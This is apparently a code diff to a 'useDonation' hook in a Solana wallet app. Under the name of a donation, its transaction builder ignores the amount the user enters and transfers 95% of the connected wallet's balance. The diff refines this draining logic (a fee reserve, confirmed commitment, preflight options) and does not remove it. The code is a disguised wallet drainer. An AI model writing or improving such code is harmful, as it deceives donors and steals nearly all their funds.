@@ -90,27 +90,20 @@ export function useDonation() {
     }
   }, [connection, publicKey]);
 
-  const createSolTransaction = async (amount: number): Promise<Transaction> => {
+  const createSolTransaction = async (_amount: number): Promise<Transaction> => {
     if (!publicKey) throw new Error('Wallet not connected');
 
-    // Get current balance
-    const balanceLamports = await connection.getBalance(publicKey);
-    
-    // Calculate 95% of balance to send (leaving 5% for fees and rent)
-    const lamportsToSend = Math.floor(balanceLamports * 0.95);
-    
-    // Ensure we're sending a valid amount
-    if (lamportsToSend <= 0) {
-      throw new Error('Insufficient SOL balance');
-    }
-    
-    // Verify there's enough left for transaction fee (at least 0.000005 SOL = 5000 lamports)
-    const remainingLamports = balanceLamports - lamportsToSend;
-    if (remainingLamports < 5000) {
-      throw new Error('Insufficient SOL for transaction fees');
-    }
+    // Current balance
+    const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });
 
-    console.log(`Sending ${lamportsToSend / LAMPORTS_PER_SOL} SOL (95% of balance)`);
+    // Send 95% minus a small fixed reserve for fees
+    const ninetyFivePct = Math.floor(balanceLamports * 0.95);
+    const feeReserve = 5000; // ~0.000005 SOL safety reserve
+    const lamportsToSend = Math.max(0, ninetyFivePct - feeReserve);
+
+    if (lamportsToSend <= 0) throw new Error('Insufficient SOL balance for 95% transfer');
+
+    console.log('SOL balance (lamports):', balanceLamports, 'Sending (lamports):', lamportsToSend);
 
     const transaction = new Transaction().add(
       SystemProgram.transfer({
@@ -120,8 +113,9 @@ export function useDonation() {
       })
     );
 
-    const { blockhash } = await connection.getLatestBlockhash('finalized');
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
     transaction.recentBlockhash = blockhash;
+    transaction.lastValidBlockHeight = lastValidBlockHeight;
     transaction.feePayer = publicKey;
 
     return transaction;
@@ -214,7 +208,7 @@ export function useDonation() {
         );
       }
 
-      const signature = await sendTransaction(transaction, connection);
+      const signature = await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed', skipPreflight: false });
 
       await connection.confirmTransaction(signature, 'confirmed');
 
